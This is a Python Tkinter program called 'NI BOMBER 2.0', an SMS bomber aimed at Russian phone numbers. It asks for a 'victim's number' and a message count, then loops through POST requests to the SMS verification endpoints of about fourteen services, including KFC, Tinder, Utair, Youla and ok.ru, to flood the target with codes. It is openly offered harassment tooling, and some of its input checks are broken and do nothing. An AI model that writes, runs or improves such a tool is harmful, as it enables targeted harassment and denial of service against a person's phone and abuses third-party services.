from tkinter import *
import requests


class Main(Frame):
    def __init__(self, root):
        super().__init__(root)

root = Tk()
app = Main(root)
app.place()
root.title('NI BOMBER')
root.geometry("600x400")
root.configure(background = "#0C0C28")

name = Label(root, text = "NI BOMBER 2.0", bg = '#0C0C28', fg = '#14FF0A', font = 'Helvetica 18 bold')
name.place(x = 210, y = 10)



#logic
def bomber(event):
    number = int(ent.get())
    sms = int(ent2.get())
    def check_number(number):
        try:
            int(len(number)) == 10
            int(number[1]) == 9 or 8
            check = Label(root, text = "check number - OK")
            check.place(x = 300, y = 100)
        except:
            check = Label(root, text = "неправильный номер")
            check.place(x = 300, y = 100)

    def attack(number, sms):
        number_7 = str(7) + str(number)
        number_plus7 = str(+7) + str(number)
        number_8 = str(8) + str(number)
        sent = 0
        while sent < sms:
            wwork = requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": number_7, "type": 2})

            sent += 1

            sun = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7})
            
            sent += 1
            qlean = requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": number_7})
            
            sent += 1
    
            cloud = requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"})
            
            sent += 1
         
            kfc = requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7})
            
            sent += 1
         
            utair = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers = {})
            
            sent += 1
            
            tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers = {})
            
            sent += 1
           
            citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/')
            
            sent += 1
            
            ok = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7})

            sent += 1
            
            rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': number}).json()["res"]
            
            sent += 1
            
            karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers = {})
            
            sent += 1
            
            youdrive = requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'}, headers = {})
            
            sent += 1
            
            mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers={})
            
            sent += 1
            
            youla = requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers = {})
    check_number(number)
    attack(number, sms)

code = Label(root, text = "номер жертвы", fg = '#00ED00', bg = '#0C0C28', font = 'Helvetica 10 bold')
ent = Entry(root)
code.place(x = 220, y = 60)
ent.place(x = 400, y = 60)


code2 = Label(root, text = "сколько sms отправить?", fg = '#00ED00', bg = '#0C0C28', font = 'Helvetica 10 bold')
ent2 = Entry(root)
code2.place(x = 220, y = 90)
ent2.place(x = 400, y = 90)


start = Button(text='BOMB!', font = 'Helvetica 15 bold', fg = '#FF0000', bg = '#0C0C28', width = 15, height = 2)
start.place(x = 210, y = 130)

start.bind("<Button-1>", bomber)
telegram = Label(root, text = "  coded by nikait\t   \ntelegram: @aaanikit", bg = '#0C0C28', fg = '#D10A62', font = 26)

telegram.place(x = 5, y = 327)
context = Label(root, text = 'ТОЛЬКО ДЛЯ РОССИИ!', bg = '#0C0C28', fg = '#FF0000', font = 'Helvetica 12 bold')

context_number = Label(root, text = '\t\t    номер вводить без префиксов\nв формате:', bg = '#0C0C28', fg = '#FF0000', font = 'Helvetica 10 bold')

number_text = Label(root, text = '9XXXXXXXXX', bg = '#0C0C28', fg = '#00ED00', font = 'Helvetica 10 bold')

context.place(x = 390, y = 300)
context_number.place(x = 250, y = 330)
number_text.place(x = 460, y = 347)

root.mainloop()
